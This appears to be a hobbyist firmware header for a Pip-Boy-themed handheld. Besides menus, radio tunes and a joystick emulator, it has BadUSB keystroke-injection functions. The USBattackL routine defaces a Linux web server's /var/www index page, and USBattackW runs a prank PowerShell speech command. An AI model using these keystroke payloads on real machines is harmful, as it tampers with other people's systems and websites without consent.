#pragma once

#include "arrays.h"

void plotData() {
  Sprites::drawSelfMasked(96, 18, sinewave, currentawaveframe);
  Sprites::drawSelfMasked(109, 18, sinewave, currentbwaveframe);
  if (currentawaveframe < 23) {
    ++currentawaveframe;
  }
  else {
    currentawaveframe = firstframe;
  }
  if (currentbwaveframe < 23) {
    ++currentbwaveframe;
  }
  else {
    currentbwaveframe = firstframe;
  }
}



void animate() {
  if (pipboy.everyXFrames(9)) {
    if (currentframe < framecount) {
      ++currentframe;
      ++startcounter;
    }
    else {
      currentframe = firstframe;
    }
  }
}
void startup() {
  //start animation, vault boy probably.
  Sprites::drawOverwrite(WIDTH / 2 - vaultboyWidth / 2, 0, vaultboy, currentframe);
  animate();
  pipboy.setCursor(0, 28);
  pipboy.print(F("PIP-BOY"));
  pipboy.setCursor(85, 28);
  pipboy.print(F("32,000"));
  if (pipboy.justPressed(A_BUTTON)) {
    pipboy.digitalWriteRGB(RGB_OFF, RGB_OFF, RGB_OFF);
  }
  if (startcounter == framecount * 3) {
    gamestate = 1;
  }
}

void handleMainMenu() {
  if (mainMenu == INV) { //highlight INV
    pipboy.drawLine(0, 51, 35, 51);
    pipboy.drawLine(35, 51, 35, 64);
  }
  if (mainMenu == USB) { //highlight UDB
    pipboy.drawLine(33, 51, 65, 51);
    pipboy.drawLine(33, 51, 33, 65);
    pipboy.drawLine(65, 51, 65, 64);
  }
  if (mainMenu == MAP) { //highlight MAP
    pipboy.drawLine(63, 51, 63, 64);
    pipboy.drawLine(63, 51, 95, 51);
    pipboy.drawLine(95, 51, 95, 64);
  }
  if (mainMenu == RAD) { //highlight RAD
    pipboy.drawLine(93, 51, 93, 64);
    pipboy.drawLine(93, 51, 128, 51);
  }
  if (pipboy.justPressed(RIGHT_BUTTON) && mainMenu < 3) {
    ++mainMenu;
  }
  if (pipboy.justPressed(LEFT_BUTTON) && mainMenu > 0) {
    --mainMenu;
  }
}
void gamecontroller() {
  // Initialize Joystick Library
  Joystick.begin();
  Joystick.setXAxis(m);
  Joystick.setYAxis(m);
  bool dirty = true;
  int prevx = 0, prevy = 0;
  bool button0, button1, button2, button3, button4, button5;
  int x = 0, y = 0;

  if (holdSpecialButton < millis())
  {
    if (startButton || selectButton)
    {
      Joystick.setButton(2, false);
      Joystick.setButton(3, false);
      selectButton = false;
      startButton = false;
    }

    if (button2 != pipboy.pressed(UP_BUTTON)) {
      y -= m;
      button2 = !button2;
      Joystick.setButton(4, button2);

    }

    if (button3 != pipboy.pressed(DOWN_BUTTON)) {
      y += m;
      button3 = !button3;
      Joystick.setButton(5, button3);
    }

    if (button4 != pipboy.pressed(LEFT_BUTTON)) {
      x -= m;
      button4 = !button4;
      Joystick.setButton(6, button4);
    }

    if (button5 != pipboy.pressed(RIGHT_BUTTON)) {
      x += m;
      button5 = !button5;
      Joystick.setButton(7, button5);
    }

    if (x != prevx)
    {
      Joystick.setXAxis(x);
      prevx = x;
    }
    if (y != prevy)
    {
      Joystick.setYAxis(y);
      prevy = y;
    }

    if (x == 0 && pipboy.pressed(LEFT_BUTTON) && pipboy.notPressed(A_BUTTON + B_BUTTON)) // Start button
    {
      if (startHeldDown == 0)
        startHeldDown = millis();
      else if (millis() - startHeldDown > buttonHeldTime)
      {
        holdSpecialButton = millis() + buttonReleaseTime;
        Joystick.setButton(3, true);
        startButton = true;
      }
    }
    else
      startHeldDown = 0;

    if (y == 0 && pipboy.pressed(UP_BUTTON) && pipboy.notPressed(A_BUTTON + B_BUTTON)) // Select button
    {
      if (selectHeldDown == 0)
        selectHeldDown = millis();
      else if (millis() - selectHeldDown > buttonHeldTime)
      {
        holdSpecialButton = millis() + buttonReleaseTime;
        Joystick.setButton(2, true);
        selectButton = true;
      }
    }
    else
      selectHeldDown = 0;

    if (button0 != pipboy.pressed(A_BUTTON))
    {
      button0 = !button0;
      Joystick.setButton(0, button0);
    }

    if (button1 != pipboy.pressed(B_BUTTON))
    {
      button1 = !button1;
      Joystick.setButton(1, button1);
    }
    if (selectButton == true && startButton == true) {
      gamecontrolleropen = false;
      gamestate = 1;
    }
  }

  dirty = !pipboy.nextFrame();

  if (dirty)
  {
    pipboy.clear();

    // Draw joystick
    switch (x)
    {
      case 0: pipboy.drawTriangle(18, 13, 30, 25, 18, 37, WHITE); pipboy.drawRect(7, 13, 12, 25);
        pipboy.drawTriangle(46, 13, 46, 37, 34, 25, WHITE); pipboy.drawRect(46, 13, 12, 25);
        pipboy.drawLine(18, 14, 18, 36, BLACK); pipboy.drawLine(46, 14, 46, 36, BLACK);
        break;
      case -m: pipboy.fillTriangle(18, 13, 30, 25, 18, 37, WHITE); pipboy.fillRect(7, 13, 12, 25);
        pipboy.drawTriangle(46, 13, 46, 37, 34, 25, WHITE); pipboy.drawRect(46, 13, 12, 25);
        /*pipboy.drawLine(18, 14, 18, 36, BLACK);*/ pipboy.drawLine(46, 14, 46, 36, BLACK);
        break;
      case m: pipboy.drawTriangle(18, 13, 30, 25, 18, 37, WHITE); pipboy.drawRect(7, 13, 12, 25);
        pipboy.fillTriangle(46, 13, 46, 37, 34, 25, WHITE); pipboy.fillRect(46, 13, 12, 25);
        pipboy.drawLine(18, 14, 18, 36, BLACK); /*pipboy.drawLine(46, 14, 46, 36, BLACK);*/
        break;
    }

    switch (y)
    {
      case 0: pipboy.drawTriangle(32, 23, 44, 11, 20, 11, WHITE); pipboy.drawRect(20, 0, 25, 12);
        pipboy.drawTriangle(32, 27, 44, 39, 20, 39, WHITE); pipboy.drawRect(20, 39, 25, 12);
        pipboy.drawLine(43, 11, 21, 11, BLACK); pipboy.drawLine(21, 39, 43, 39, BLACK);
        break;
      case -m: pipboy.fillTriangle(32, 23, 44, 11, 20, 11, WHITE); pipboy.fillRect(20, 0, 25, 12);
        pipboy.drawTriangle(32, 27, 44, 39, 20, 39, WHITE); pipboy.drawRect(20, 39, 25, 12);
        /*pipboy.drawLine(43, 11, 21, 11, BLACK);*/ pipboy.drawLine(21, 39, 43, 39, BLACK);
        break;
      case m: pipboy.drawTriangle(32, 23, 44, 11, 20, 11, WHITE); pipboy.drawRect(20, 0, 25, 12);
        pipboy.fillTriangle(32, 27, 44, 39, 20, 39, WHITE); pipboy.fillRect(20, 39, 25, 12);
        pipboy.drawLine(43, 11, 21, 11, BLACK); /*pipboy.drawLine(21, 39, 43, 39, BLACK);*/
        break;
    }

    if (pipboy.pressed(A_BUTTON))
      pipboy.fillCircle(88, 30, 12);
    else
      pipboy.drawCircle(88, 30, 12);

    if (pipboy.pressed(B_BUTTON))
      pipboy.fillCircle(115, 24, 12);
    else
      pipboy.drawCircle(115, 24, 12);

    if (selectButton)
      pipboy.fillRoundRect(40, 56, 20, 8, 1);
    else
      pipboy.drawRoundRect(40, 56, 20, 8, 1);

    if (startButton)
      pipboy.fillRoundRect(68, 56, 20, 8, 1);
    else
      pipboy.drawRoundRect(68, 56, 20, 8, 1);

    // Rounding
    pipboy.drawPixel(20, 0, BLACK);
    pipboy.drawPixel(44, 0, BLACK);
    pipboy.drawPixel(20, 50, BLACK);
    pipboy.drawPixel(44, 50, BLACK);
    pipboy.drawPixel(7, 13, BLACK);
    pipboy.drawPixel(7, 37, BLACK);
    pipboy.drawPixel(57, 13, BLACK);
    pipboy.drawPixel(57, 37, BLACK);

    pipboy.display();
    dirty = false;
  }
}

void USBattackL() {
  delay(5000);
  CommandAtRunBarGnome("gnome-terminal");
  delay(3000);
  Keyboard.println("cd /var/www");
  delay(2000);
  Keyboard.println("mv index.* index.bak");
  delay(2000);
  Keyboard.println("touch index.html");
  delay(2000);
  Keyboard.println("nano index.html");
  delay(2000);
  Keyboard.println("<marquee><h1>You have been hacked by the BadUSB Leonardo</h1></marquee>");
  delay(2000);
  Keyboard.println("<center><a href=\"http://www.usbrubberducky.com/\"><img src=\"http://cdn.shopify.com/s/files/1/0068/2142/products/usbducky2.jpg\" /></a><center>");
  delay(2000);
  Keyboard.println("<center><h5>Your old index page can be found <a href=\"./index.bak\">here.</a></h5></center>");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('x');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println("y");
  delay(3000);
  Keyboard.println("exit");
}
void USBattackW() {
  delay(5000);
  CommandAtRunBarMSWIN("powershell");
  delay(4000);
  Keyboard.println("Add-Type -AssemblyName System.speech");
  delay(2000);
  Keyboard.println("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
  delay(2000);
  Keyboard.println("$speak.Speak(\"Where is my body? Oh. Oh, god no. Where are my eyes? Greyson, where are my eyes?\")");
  delay(2000);
  Keyboard.println("exit");
}
void lockwindows() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.println("l");
  Keyboard.releaseAll();
}
void displaywindows() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.println("d");
  Keyboard.releaseAll();
}
void openterminal() {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.println("t");
  Keyboard.releaseAll();
}
void subMenus() {
  if (mainMenu == INV) {
    tinyfont.setCursor(6, 0);
    tinyfont.print(F("\n \n Lock \n \n Key \n \n Emergency\n Cache"));
    pipboy.drawLine(62, 0, 62, 52);
    INVcursorx = 0;
    tinyfont.setCursor(64, 5);
    switch (INVselect) {
      case 0: //Lock
        INVcursory = 10;
        tinyfont.print(F("(25N, 75W)\n Be sure to \n lock up when \n you're done!"));
        break;

      case 1: //Key
        INVcursory = 20;
        tinyfont.print(F("Under\nfloorboards:\n\n\n(37.2431N\n115.7930W)"));
        break;

      case 2://Emergency Cache
        INVcursory = 30;
        tinyfont.print(F("(38.8860N\n77.0214W)"));
        break;
    }
    if (pipboy.justPressed(DOWN_BUTTON) && INVselect < 2) INVselect += 1;
    if (pipboy.justPressed(UP_BUTTON) && INVselect > 0) INVselect -= 1;

    pipboy.fillRect(INVcursorx, INVcursory, 4, 4);
  }
  if (mainMenu == MAP) {
    pipboy.drawBitmap(0, 0, hmap, 128, 52);
  }
  if (mainMenu == USB) {
    pipboy.setCursor(0, 0);
    pipboy.print(F("   BadUSB Attack(W) \n   BadUSB Attack(L) \n   Game Controller \n   Lock Windows \n   Display Windows \n   Open Terminal(L)"));
    switch (USBselect) {

      case 0:
        pipboy.setCursor(5, 0);
        break;

      case 1:
        pipboy.setCursor(5, 8);
        break;

      case 2:
        pipboy.setCursor(5, 16);
        break;

      case 3:
        pipboy.setCursor(5, 24);
        break;

      case 4:
        pipboy.setCursor(5, 32);
        break;

      case 5:
        pipboy.setCursor(5, 40);
        break;

    }
    pipboy.print(F(">"));
    if (pipboy.justPressed(DOWN_BUTTON) && USBselect < 5) USBselect += 1;
    if (pipboy.justPressed(UP_BUTTON) && USBselect > 0) USBselect -= 1;
    if (pipboy.justPressed(A_BUTTON) && USBselect == 0) {
      USBattackW();
    }
    if (pipboy.justPressed(A_BUTTON) && USBselect == 2) {  //hold all four directions to exit
      gamecontrolleropen = true;
      gamestate = 2;
    }
    if (pipboy.justPressed(A_BUTTON) && USBselect == 1) {
      USBattackL();
    }
    if (pipboy.justPressed(A_BUTTON) && USBselect == 3) {
      lockwindows();
    }
    if (pipboy.justPressed(A_BUTTON) && USBselect == 4) {
      displaywindows();
    }
    if (pipboy.justPressed(A_BUTTON) && USBselect == 5) {
      openterminal();
    }
  }
  if (mainMenu == RAD) {
    tinyfont.setCursor(6, 0);
    tinyfont.print(F(" Into Each Life \n \n Crawl Out Through \n The Fallout"));
    switch (RADselect) {
      case 0:
        pipboy.setCursor(0, 0);
        break;

      case 1:
        pipboy.setCursor(0, 10);
        break;
    }
    pipboy.print(F(">"));
    Sprites::drawSelfMasked(94, 10, radiograph, 0);
    plotData();
    if (pipboy.justPressed(DOWN_BUTTON) && RADselect < 1) RADselect += 1;
    if (pipboy.justPressed(UP_BUTTON) && RADselect > 0) RADselect -= 1;
    if (pipboy.justPressed(A_BUTTON) && RADselect == 0) {
      radio.tones(intoeachlife);
    }
    if (pipboy.justPressed(A_BUTTON) && RADselect == 1) radio.tones(crawlout);

    while (radio.playing()) {
      pipboy.clear();
      pipboy.drawLine(93, 51, 93, 64);
      pipboy.drawLine(93, 51, 128, 51);
      pipboy.setCursor(0, 56);
      pipboy.print(F("  INV  USB  MAP  RAD"));
      pipboy.drawLine(0, 52, 128, 52);//bottom H-line
      pipboy.drawLine(34, 52, 34, 64);//INV | USB
      pipboy.drawLine(64, 52, 64, 64);// USB | MAP
      pipboy.drawLine(94, 52, 94, 64);// MAP | RAD
      tinyfont.setCursor(6, 0);
      tinyfont.print(F(" Into Each Life \n \n Crawl Out Through \n The Fallout"));
      switch (RADselect) {
        case 0:
          pipboy.setCursor(0, 0);
          break;

        case 1:
          pipboy.setCursor(0, 10);
          break;
      }
      pipboy.print(F(">"));
      Sprites::drawSelfMasked(94, 10, radiograph, 0);
      plotData();
      if (pipboy.justPressed(DOWN_BUTTON) && RADselect < 1) RADselect += 1;
      if (pipboy.justPressed(UP_BUTTON) && RADselect > 0) RADselect -= 1;

      if (pipboy.pressed(RIGHT_BUTTON)) {
        radio.noTone();
      }
      pipboy.display();
    }

  }
}

void UI() {
  //actual "game"
  //menus include: Inventory (INV), MAP, USB interfaces (USB), and "Radio" (RAD)
  //draw menu
  subMenus();
  pipboy.setCursor(0, 56);
  pipboy.print(F("  INV  USB  MAP  RAD"));
  pipboy.drawLine(0, 52, 128, 52);//bottom H-line
  pipboy.drawLine(34, 52, 34, 64);//INV | USB
  pipboy.drawLine(64, 52, 64, 64);// USB | MAP
  pipboy.drawLine(94, 52, 94, 64);// MAP | RAD
  if (pipboy.pressed(B_BUTTON)) {
    startcounter = 0;
    //pipboy.digitalWriteRGB(RGB_ON, RGB_ON, RGB_ON);
    gamestate = 0;
  }
  //update menu
  handleMainMenu();
  //update specific menu parts if they are selected
  //change selection based on current screen and selection counter.
  //change current screen

}

void gameloop() {

  switch (gamestate) {

    case 0:
      startup();
      break;

    case 1:
      //user interface
      UI();

      break;

    case 2:
      gamecontroller();
      break;
  }

  if (pipboy.justPressed(B_BUTTON)) {
    pipboy.digitalWriteRGB(RGB_ON, RGB_ON, RGB_ON);
  }


}
